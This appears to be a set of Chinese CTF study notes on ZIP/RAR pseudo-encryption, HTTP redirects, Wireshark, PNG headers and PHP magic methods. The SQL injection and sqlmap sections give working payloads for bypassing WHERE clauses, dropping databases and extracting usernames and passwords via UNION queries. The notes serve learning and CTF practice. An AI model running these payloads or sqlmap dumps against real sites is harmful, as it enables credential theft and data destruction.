zip和rar文件的伪加密

zip文件的伪加密

一个 ZIP 文件由三个部分组成：
压缩源文件数据区 + 压缩源文件目录区(核心目录记录区) + 压缩源文件目录结束标志(目录记录尾部区)
第7、8个字节处为全局方式位标记，作用是判断有无加密
全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：

  • 第二个数字为奇数时 –>加密
  • 第二个数字为偶数时 –>未加密

rar文件的伪加密

rar文件由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex或010editor修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex或010editor打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可解除伪加密

http重定向

什么是http重定向

HTTP中的重定向就是当客户端访问一个服务器不可用的资源后，服务器会返回一个响应包，响应包中带有另一个链接，然后浏览器会自动跳转到另一个链接，无需用户点击，是浏览器自动跳转的。

重定向原理

客户端访问了一个不可用的资源，然后服务器返回了一个响应包。
响应包有以下特点：
1、 status code = 3xx，表示这是一个重定向包
2、 响应头中有一个location属性，对应的值为需要跳转到的新链接。
3、 浏览器自动发起一个http请求访问新链接
4、 服务器返回新链接响应的数据，在浏览器中展示

永久重定向和临时重定向

status code = 301： 永久重定向，搜索引擎或者浏览器会自动将书签、历史记录、搜索引擎对应的记录中旧链接更新为新链接。下次就访问新链接。
status code = 302： 临时重定向，原来的URL仍然有效，下次还访问旧链接。

搜集了sqlmap的一些指令

可以使用sqlmap工具一把梭，下面是一些有用的指令：

判断是否存在注入点：sqlmap.py -u url网址（如果需要完整的http请求才能登录网站，可以使用sqlmap.py -r 文件路径，这个文件指的是http请求所在的txt文件，r指的是cookie注入）

查询所有数据库：sqlmap.py -u url网址 --dbs

查询（某个数据库中的）所有表的表名：sqlmap.py -u url网址 (-D database_name) --tables
查询某个表的所有字段：sqlmap.py -u url网址 -D database_name -T table_name –columns`

查询字段内容：sqlmap.py -u url网址 -D database_name -T table_name -C column_names(可以写多个，中间用空格隔开) –dump

获取所有的用户：sqlmap.py -u url网址 --users

获取用户的密码:sqlmap.py -u url网址 --passwords

当前数据库名称：sqmap.py -u url网址 --current-db

还可以再加参数–level n(15)，等级越高，扫描越全面，从2开始进行cookie注入……

SQL注入笔记

下面是SQL注入学习过程中的笔记：

mysql简介

mysql包含四个库，分别是information_schema，mysql，performance_schema，sys（使用SHOW DATABASES访问）
information_schema存储着所有的其他数据库的信息，包含数据库名，数据库表名，数据类型，访问权限等等
其中COLUMNS存储字段信息，TABLES存储表名，SCHEMATA存储着所有数据库信息（show databases结果就存储在这个表中）
在TABLES表中，TABLE_NAME存储表名，TABLE_SCHEMA存储这个表所在的数据库
在COLUMNS表中，COLUMN_NAME存储着表的字段名，TABLE_NAME也是存储表名

一些SQL语法

  1. 注释
    1. -- （一个空格）后面的内容叫注释!
    2. #后面的内容叫注释！（可以没有空格）
  2. 列出所有数据库
    show databases;
  3. 查看某一个数据库里所有的表
    先use 数据库名;告诉他们要查哪个数据库里的表，再show tables;;
    或show tables from 数据库名
  4. select函数基本用法
    1. select now();显示当前时间
    2. select database();查看我们当前选择的是哪个库
    3. select version();查看当前版本
    4. select user();查看当前登录数据库的用户
    5. select @@datadir;查看数据路径
    6. select @@basedir;查看mysql安装路径
    7. select @@version_compile_os;查看mysql安装的系统
      重点来啦！
  5. select关键字查询数据重点用法
    select * from 数据库名.表名； 查询数据（*表示所有字段）
    查具体字段就把*换成具体字段名，如select id,host from mysql.user;查询id和host字段)
  6. union联合查询
    例：
    select * from test.t1 union select 1,2,3,4,5;
    select user,host from mysql.user union select * from test.t1;
  7. where条件
    where相当于编程语言中的if
    例：select user,host from mysql.user where user=’root’;
  8. 创建库
    create database test charset utf8mb4;创建一个名为test的数据库
  9. 创建表
    先use test；
    再create table t1(id int);
    效果为：在test数据库里创建一个名为t1的表，含有一个名为id的字段，数据类型为int
  10. 删除表
    drop table t1 删除表t1
  11. 给表添加字段
    alter table 表名 add 字段名 数据类型
    例：alter table t1 add name varchar(32);
  12. 插入数据
    insert into t1 values (1,"张三"),(2,"李四"),(3,"王五")

判断是否存在SQL注入漏洞

对于一个陌生网站，判断其是否存在SQL注入漏洞：
输入框内输入一个英文单引号’并上传，然后F12，进入Network网络部分查看Response
若提示SQL语法存在错误，则该网站大概率存在SQL注入漏洞。

GET型SQL注入漏洞

我们在提交网页内容的时候，主要分为GET方法，POST方法，GET方法提交的内容会显示在网页的URL上，
通过对URL连接进行构造，可以获得超出权限的信息内容。

注入内容：
' or 1=1#
或' or 1=1 --
(此处英文单引号的作用是使条件闭合，在语法上形成完整的SQL语句，而#或-- 的作用是注释掉后面的多余内容)

  • 检索隐藏数据
  • 修改应用程序（语句）逻辑
  • Union attack
  • 获取敏感数据
  • 盲注

应用

提交，查看URL

  1. 通过注入语句修改查询条件以获取隐藏信息：
    应注入xxx' -- 或xxx'#来实现这一点
  2. 查询出所有数据信息：
    注入xxx' or 1=1#或xxx' or 1=1 -- 来干掉sql语句中的where条件
  3. 删库
    注入xxx';drop database 数据库名;#
    或xxx';drop database 数据库名; --
    （前提：服务端连接数据库时允许执行多条sql语句）
  4. 拿到所有用户名和密码并登陆系统
    用到：联合注入（union attack)!
    1. 拿到数据库database
      database()返回当前连接的数据库是哪个
    2. 拿到表table
    3. 拿到表里的字段
    4. 分析是否包含形如username，password等的字段
      注：联合注入需要知道union前面的表包含几个字段，union后面字段数应与前面一致
      爆字段数的步骤：
      执行select * from products union select 1;
      若报错则说明前后字段数不一致
      改为select * from products union select 1，2;
      再报错再改成select 1,2,3;
      直到有回显为止！
      知道了表的字段数！
      接下来把union后面的1，2，3等改为一些需要的函数，如user(),database()等
      例：select * from products union select 1,user(),3,version(),database();
      注意：
      1.改的时候注意对应字段的数据类型！要与函数的返回类型对应！
      2.根据语句语法在最后加#注释多余内容防止报错！
      (格式如：输入框里输gifts’ union select 1,2,3,4#)

在输入框里输入gifts' union select 1,database(),3,4#即可拿到数据库名。
拿到数据库名后，接下来拿表名：
在输入框里输入1' union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#得到表名。
接下来分析表字段(假设有一张表，名为user)：
输入1' union select 1,database(),column_name,4 from information_schema.columns where table_name='user' and table_schema=database()#
指出当前数据库中的名为user的表中的字段名
假设有字段名为username和password
则输入1'union select 1,username,password,4 from user #
可以拿到用户名和密码！！！

数据流的追踪

  • 我们的一个完整的数据流一般都是由很多个包组成的；
  • 所以当我们想查看某条数据包对于的数据流的话。可以选中数据，右键选择追踪流；
  • 里面就会有tcp流、udp流、ssl流、http流。数据包属于哪种流就选择对应的流；
  • 当我们选择了追踪流时，会弹出该流的完整的数据流还有这个数据流中包含的数据包，对话框下面可以选择数据流方向，顶部的过滤器就是该流的过滤规则

数据包的统计分析

  • 统计中的协议分级功能可以查看所选包协议的分布情况，帮助识别可疑协议，和不正常的网络应用程序.
  • 在Endpoints窗口中，可以通过排序Bytes和Tx Bytes来判断占用带宽最大的主机
  • Conversions窗口可以看到两个主机之间发送/接收数据包的数量、字节大小以及数据的流向情况，也可以通过排序来判断占用最大带宽的主机；
  • 在Conversions窗口中只能看到会话的统计情况，无法看到包的具体内容；
  • 这时可以使用快速过滤会话功能，过滤出想要查看的内容；
  • 快速过滤会话的功能在Conversions窗口中进行操作，可以对选中的会话或者非选中的会话选择数据流向进行过滤

数据包的大致结构

  • 第一行：数据包整体概述
  • 第二行：链路层详细信息，主要的是双方的mac地址
  • 第三行：网络层详细信息，主要的是双方的IP地址
  • 第四行：传输层的详细信息，主要的是双方的端口号
  • 第五行：TCP或UDP是传输的DATA，DNS这是域名的相关信息

png文件结构及图片CRC相关

来源题目：攻防世界normal_png_

png文件结构

png格式的图片，文件头是89 50 4E 47 0D 0A 1A 0A 00 00 00 0D

第二行前四位是宽，接下来四位是高。接下来两位分别是图像深度和颜色类型。

具体内容参照：https://blog.csdn.net/Fiverya/article/details/104126369

通过CRC可计算图片的宽度与高度，CTF比赛类题目，将一个图片用stegsolve打开，查看CRC,若CRC校验没有错误，但是图片不全，可能是因为图片的高度和宽度不够，导致没有完全显示。这时候我们找到文件中表示宽和高的位置进行修改即可。

一些php魔术方法（unserialize3题解附）

我们了解一下一些php魔术方法

  • __construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能
  • 注意：PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。
  • __sleep() 和 __wakeup()
    public __sleep ( void ) : array
    __wakeup ( void ) : void
    serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。
    Note:
    （1）__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。
    （2）__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。
    （3）与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。
    （4）__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。
  • 访问控制
    PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。
    public（公有）：公有的类成员可以在任何地方被访问。
    protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。
    private（私有）：私有的类成员则只能被其定义所在的类访问。
  • unserialize() 将已序列化的字符串还原回 PHP 的值。
    序列化请使用 serialize() 函数。
    语法
    unserialize(str)
    参数 描述
    str 必需。一个序列化字符串。
    __wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。
